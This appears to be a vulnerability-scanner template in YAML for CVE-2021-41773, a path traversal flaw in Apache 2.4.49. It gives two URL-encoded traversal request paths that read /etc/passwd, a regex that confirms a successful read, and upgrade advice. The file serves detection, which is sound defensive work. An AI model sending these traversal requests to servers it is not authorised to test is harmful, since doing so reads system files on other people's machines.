id: CVE-2021-41773-apache-path-traversal
cve: CVE-2021-41773
name: "Apache 2.4.49 Path Traversal + RCE"
severity: critical
cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
tags: [rce, apache, path-traversal, cisa-kev]
target_service: http
description: |
  Apache HTTP Server 2.4.49 path traversal via URL-encoded dots.
  With mod_cgi enabled, allows remote code execution.
detection:
  - type: http
    method: GET
    path: "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    match:
      - status_code: 200
      - body_regex: "root:.*:0:0:"
  - type: http
    method: GET
    path: "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    match:
      - status_code: 200
      - body_regex: "root:.*:0:0:"
  - type: version
    cpe_vendor: "apache"
    cpe_product: "http_server"
    version_range: ">=2.4.49,<=2.4.50"
remediation: "Upgrade Apache to 2.4.51+."
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-41773
  - https://httpd.apache.org/security/vulnerabilities_24.html
